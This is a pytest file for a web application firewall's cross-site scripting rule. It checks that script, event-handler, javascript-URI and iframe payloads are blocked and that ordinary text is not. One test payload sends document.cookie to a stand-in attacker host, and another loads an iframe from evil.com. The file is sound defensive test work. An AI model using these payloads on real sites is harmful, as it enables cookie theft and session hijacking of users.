from bastion.core.normalizer import normalize_request
from bastion.rules.xss import XSSRule


def _match(query_string="", body=b"", headers=None, path="/"):
    request = normalize_request(
        "GET",
        path=path,
        query_string=query_string,
        headers=headers or {},
        body=body,
    )
    return XSSRule().match(request)


def test_xss_script_tag_blocked():
    verdict = _match(query_string="name=<script>alert('xss')</script>")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_onerror_img_blocked():
    verdict = _match(query_string="avatar=<img src=x onerror=alert(1)>")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_javascript_uri_blocked():
    verdict = _match(query_string="url=javascript:alert(document.cookie)")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_svg_onload_blocked():
    verdict = _match(query_string="data=<svg/onload=alert(1)>")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_iframe_injection_blocked():
    verdict = _match(query_string="content=<iframe src='http://evil.com'></iframe>")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_dom_document_cookie_blocked():
    verdict = _match(query_string="q=window.location='http://attacker.com/?c='+document.cookie")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_in_body_blocked():
    verdict = _match(
        body=b'{"comment": "<script>alert(1)</script>"}',
        headers={"Content-Type": "application/json"},
    )
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_in_path_blocked():
    verdict = _match(path="/search/<script>alert(1)</script>")
    assert verdict.blocked
    assert verdict.rule_id == "941100"


def test_xss_clean_request_allowed():
    verdict = _match(query_string="name=John+Doe&message=Hello+World!+How+are+you?")
    assert not verdict.blocked


def test_xss_no_false_positive_on_common_words():
    # Words like online=, only=, onsite= should not trigger event handler regex
    verdict = _match(query_string="status=online&sort=only&onsite=true&ongoing=yes")
    assert not verdict.blocked


def test_xss_no_false_positive_on_plain_text_sentences():
    # Plain text containing words like confirm, alert, prompt
    verdict = _match(query_string="msg=Please+confirm+(yes/no)+your+booking+before+the+deadline")
    assert not verdict.blocked

